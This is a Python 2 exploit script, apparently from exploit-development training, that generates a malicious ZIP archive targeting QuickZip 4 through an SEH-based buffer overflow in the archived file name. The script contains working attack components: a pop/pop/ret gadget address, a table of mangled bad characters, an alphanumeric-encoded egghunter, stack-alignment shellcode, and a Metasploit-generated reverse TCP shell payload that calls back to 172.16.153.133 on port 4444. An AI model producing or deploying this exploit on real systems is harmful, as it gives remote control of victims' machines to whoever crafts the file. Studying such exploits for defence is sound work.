#!/usr/bin/env python
# Original Author : corelanc0d3r
# Pocython Author: d3cc3pt10n
# Note: Python 3 doesn't work, Python 2 does...weird!

from struct import pack

filename = 'pycorelanboom.zip'
filesize = '\xe4\x0f'

# Local file header
# 30 bytes
ldf_header = (
        "\x50\x4B\x03\x04"
        "\x14\x00\x00\x00"
        "\x00\x00\xB7\xAC"
        "\xCE\x34\x00\x00"
        "\x00\x00\x00\x00"
        "\x00\x00\x00\x00"
        "\x00"
        + filesize +          # file size 4068
        "\x00"
        "\x00\x00")

# Central directory header
# 46 bytes
cdf_header = (
    "\x50\x4B\x01\x02"
    "\x14\x00\x14\x00"
    "\x00\x00\x00\x00"
    "\xB7\xAC\xCE\x34"
    "\x00\x00\x00\x00"
    "\x00\x00\x00\x00"
    "\x00\x00\x00\x00"
    + filesize +
    "\x00\x00\x00\x00"
    "\x00\x00\x01\x00"
    "\x24\x00\x00\x00"
    "\x00\x00\x00\x00")

# End of file central directory header
# 22 bytes
eofcdf_header = (
    "\x50\x4B\x05\x06"
    "\x00\x00\x00\x00"
    "\x01\x00\x01\x00"
    "\x12\x10\x00\x00" # Size of central directory (bytes)
    "\x02\x10\x00\x00" # Offset of start of central directory,
                       # relative to start of archive
    "\x00\x00")

# payload_length = 4064 pattern + 4 .txt extension = 4068
#[+] Examining SEH chain
#    SEH record (nseh field) at 0x0012fbfc overwritten with normal pattern : 0x41396a41 (offset 297), followed by 1020 bytes of cyclic data after the handler
# Message=  0x00407a33 : pop ecx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [QuickZip.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\QuickZip4\QuickZip.exe)



# 4 byte jump
# Best jump offset \xd8 \xfe \xff \xff
# Bad character mangle table. What byte becomes in quickzip
# \x81 -> FC || \x82 -> E9 || \x83 -> E2 || \x84 -> E4 || \x85 -> E0
# \x86 -> E5 || \x87 -> E7 || \x88 -> EA || \x89 -> EB || \x8a -> E8
# \x8b -> EF || \x8c -> EE || \x8d -> EC || \x8e -> C4 || \x8f -> C5
# \x90 -> C9 = 55 || \x91 -> E6 || \x92 -> C6 || \x93 -> F4 || \x94 -> F6
# \x95 -> F2 || \x96 -> FB || \x97 -> F9 || \x98 -> FF || \x99 -> D6
# \x9a -> DC || \x9b -> A2 || \x9c -> A3 || \x9d -> A5 || \x9e -> 50
# \x9f -> 83 || \xa0 -> E1 || \xa1 -> ED || \xa3 -> FA || \xa4 -> F1
# \xa5 -> D1 || \xa6 -> AA || \xa7 -> BA || \xa8 -> BF || \xa9 -> AC
# \xaa -> AC || \xab -> BD || \xac -> BC || \xad -> A1 || \xae -> AB
# \xaf -> BB || \xb0 -> A6 || \xb1 -> A6 || \xb2 -> A6 || \xb3 -> A6
# \xb4 -> A6 || \xb5 -> A6 || \xb6 -> A6
# 83 == -125 bytes.
# 125 - 32 byte egghunter = 93 
nseh = '\x71\x9F\x70\x9F'
# EIP
# < means little-endian
# L means unsigned long - 4 bytes
seh = pack('<L', 0x00407a33)
# msfvenom -p generic/custom PAYLOADFILE=egghunter.bin BufferRegister=EDX -e x86/alpha_mixed -a x86 -f py --platform windows -v egghunter
# Payload size: 117 bytes
egghunter =  ""
egghunter += "\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a"
egghunter += "\x4a\x4a\x4a\x4a\x4a\x37\x52\x59\x6a\x41\x58\x50"
egghunter += "\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
egghunter += "\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42"
egghunter += "\x75\x4a\x49\x50\x66\x4d\x51\x59\x5a\x79\x6f\x64"
egghunter += "\x4f\x50\x42\x63\x62\x71\x7a\x53\x32\x61\x48\x5a"
egghunter += "\x6d\x74\x6e\x47\x4c\x55\x55\x63\x6a\x72\x54\x78"
egghunter += "\x6f\x6e\x58\x31\x67\x64\x70\x50\x30\x61\x64\x6c"
egghunter += "\x4b\x5a\x5a\x6e\x4f\x50\x75\x68\x6a\x4c\x6f\x73"
egghunter += "\x45\x39\x77\x79\x6f\x6b\x57\x41\x41"
# we have to push our desired instructions in reverse of how we want them to occur
aligner = (
        # \x00 \x12 \xFA \xD3
        # !mona encode -t alphanum -s 'x\D8\xFA\x12\x00'
        '%JMNU%521*-bVNU-bVNU-dXPUP' # calculate the start of our shellcode, and push it on the stack
        '\x5A' # POP EDX
        '\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A' # zero out EAX
        '\x54\x58' # PUSH ESP / POP EAX
        '\x2D\x38\x53\x55\x55\x2D\x46\x53\x55\x55\x2D\x42\x53\x55\x55'
        '\x50\x5C' # Push EAX / POP ESP
        # \x90 \x90 \xFF \xE2 - NOP NOP JMP EDX
        # !mona encode -t alphanum -s '\x90\x90\xFF\xE2'
        '%JMNU%521*-%%U]-%%U]-&%VbP' # calculate JMP and push it onto the stack
)
# 81 bytes
aligner_len = len(aligner)
egghunter_nop_sled = ('A' * 5)
tag = 'w00tw00t'
# msfvenom -p windows/shell_reverse_tcp LHOST=172.16.153.133 LPORT=4444 -e x86/alpha_mixed -f python -v revshell -a x86 --platform windows
# x86/alpha_mixed chosen with final size 710
# Payload size: 710 bytes
revshell =  ""
revshell += "\x89\xe1\xda\xd8\xd9\x71\xf4\x5d\x55\x59\x49\x49"
revshell += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
revshell += "\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
revshell += "\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
revshell += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
revshell += "\x6b\x4c\x6d\x38\x6d\x52\x35\x50\x73\x30\x65\x50"
revshell += "\x65\x30\x4f\x79\x4d\x35\x66\x51\x79\x50\x55\x34"
revshell += "\x4c\x4b\x56\x30\x70\x30\x4c\x4b\x52\x72\x46\x6c"
revshell += "\x4e\x6b\x76\x32\x66\x74\x6e\x6b\x32\x52\x71\x38"
revshell += "\x44\x4f\x6e\x57\x70\x4a\x71\x36\x30\x31\x59\x6f"
revshell += "\x4c\x6c\x77\x4c\x65\x31\x53\x4c\x37\x72\x34\x6c"
revshell += "\x51\x30\x5a\x61\x58\x4f\x76\x6d\x35\x51\x6b\x77"
revshell += "\x59\x72\x69\x62\x61\x42\x33\x67\x6c\x4b\x43\x62"
revshell += "\x44\x50\x4c\x4b\x71\x5a\x77\x4c\x4c\x4b\x30\x4c"
revshell += "\x64\x51\x73\x48\x68\x63\x30\x48\x33\x31\x38\x51"
revshell += "\x53\x61\x6c\x4b\x30\x59\x67\x50\x33\x31\x5a\x73"
revshell += "\x6e\x6b\x57\x39\x67\x68\x78\x63\x67\x4a\x72\x69"
revshell += "\x4e\x6b\x65\x64\x4e\x6b\x47\x71\x59\x46\x70\x31"
revshell += "\x79\x6f\x4c\x6c\x79\x51\x7a\x6f\x36\x6d\x65\x51"
revshell += "\x6b\x77\x76\x58\x6b\x50\x42\x55\x6b\x46\x74\x43"
revshell += "\x33\x4d\x38\x78\x77\x4b\x43\x4d\x61\x34\x61\x65"
revshell += "\x39\x74\x76\x38\x4c\x4b\x31\x48\x71\x34\x55\x51"
revshell += "\x48\x53\x31\x76\x4c\x4b\x66\x6c\x42\x6b\x4c\x4b"
revshell += "\x31\x48\x65\x4c\x56\x61\x69\x43\x4e\x6b\x57\x74"
revshell += "\x4c\x4b\x53\x31\x4e\x30\x6b\x39\x42\x64\x47\x54"
revshell += "\x55\x74\x63\x6b\x63\x6b\x55\x31\x71\x49\x30\x5a"
revshell += "\x43\x61\x4b\x4f\x49\x70\x61\x4f\x63\x6f\x53\x6a"
revshell += "\x4e\x6b\x75\x42\x7a\x4b\x4c\x4d\x43\x6d\x71\x78"
revshell += "\x66\x53\x46\x52\x53\x30\x33\x30\x33\x58\x64\x37"
revshell += "\x52\x53\x77\x42\x71\x4f\x31\x44\x30\x68\x52\x6c"
revshell += "\x42\x57\x45\x76\x76\x67\x4b\x4f\x6e\x35\x4e\x58"
revshell += "\x7a\x30\x63\x31\x45\x50\x77\x70\x44\x69\x78\x44"
revshell += "\x31\x44\x46\x30\x73\x58\x45\x79\x4d\x50\x42\x4b"
revshell += "\x65\x50\x4b\x4f\x4e\x35\x62\x70\x72\x70\x72\x70"
revshell += "\x72\x70\x31\x50\x62\x70\x51\x50\x36\x30\x52\x48"
revshell += "\x79\x7a\x34\x4f\x69\x4f\x79\x70\x39\x6f\x49\x45"
revshell += "\x6f\x67\x53\x5a\x33\x35\x51\x78\x6e\x4c\x32\x30"
revshell += "\x4f\x69\x6c\x45\x31\x78\x66\x62\x37\x70\x47\x61"
revshell += "\x51\x4c\x4e\x69\x79\x76\x62\x4a\x56\x70\x33\x66"
revshell += "\x73\x67\x52\x48\x6c\x59\x4c\x65\x63\x44\x35\x31"
revshell += "\x6b\x4f\x78\x55\x6d\x55\x4b\x70\x71\x64\x66\x6c"
revshell += "\x4b\x4f\x42\x6e\x35\x58\x70\x75\x38\x6c\x43\x58"
revshell += "\x38\x70\x6e\x55\x59\x32\x76\x36\x49\x6f\x4e\x35"
revshell += "\x65\x38\x75\x33\x72\x4d\x75\x34\x55\x50\x6f\x79"
revshell += "\x58\x63\x52\x77\x53\x67\x52\x77\x56\x51\x4a\x56"
revshell += "\x53\x5a\x46\x72\x46\x39\x36\x36\x58\x62\x69\x6d"
revshell += "\x62\x46\x7a\x67\x43\x74\x35\x74\x77\x4c\x67\x71"
revshell += "\x37\x71\x6c\x4d\x70\x44\x51\x34\x74\x50\x6b\x76"
revshell += "\x77\x70\x51\x54\x70\x54\x50\x50\x31\x46\x53\x66"
revshell += "\x56\x36\x53\x76\x76\x36\x62\x6e\x53\x66\x46\x36"
revshell += "\x61\x43\x32\x76\x55\x38\x73\x49\x5a\x6c\x47\x4f"
revshell += "\x4c\x46\x39\x6f\x38\x55\x4b\x39\x59\x70\x32\x6e"
revshell += "\x73\x66\x73\x76\x6b\x4f\x56\x50\x61\x78\x73\x38"
revshell += "\x4b\x37\x47\x6d\x53\x50\x39\x6f\x4e\x35\x6d\x6b"
revshell += "\x4c\x30\x68\x35\x69\x32\x33\x66\x55\x38\x59\x36"
revshell += "\x4d\x45\x6d\x6d\x4f\x6d\x59\x6f\x38\x55\x55\x6c"
revshell += "\x54\x46\x43\x4c\x77\x7a\x6f\x70\x4b\x4b\x6b\x50"
revshell += "\x54\x35\x74\x45\x6d\x6b\x57\x37\x74\x53\x42\x52"
revshell += "\x52\x4f\x52\x4a\x63\x30\x32\x73\x6b\x4f\x6b\x65"
revshell += "\x41\x41"


# 297 until we hit nseh, so 297 - 117 = 180 - 5 nops = 175
offset_len = len(egghunter_nop_sled) + len(egghunter) + 73 + aligner_len + 20
if offset_len != 297:
    print('[!] Offset length to nSEH is wrong.')
    print(offset_len)
    exit(1)
payload = egghunter_nop_sled + egghunter + ('A' * 73) + aligner + ('A' * 20) + nseh + seh + ('D' * 10) + tag + revshell + ('\x90'*(
    4068 - len(egghunter_nop_sled) - len(egghunter) - 93 - len(aligner) - len(nseh) - len(seh) - 10 - len(tag) - len(revshell)))
payload_length = len(payload)

if payload_length != 4068:
    print("[!] Warning, payload size isn't correct!")

exploit = ldf_header + payload + cdf_header + payload + eofcdf_header

print("Size : {s}n".format(s=payload_length))
with open(filename, 'w') as f:
    f.write(exploit)
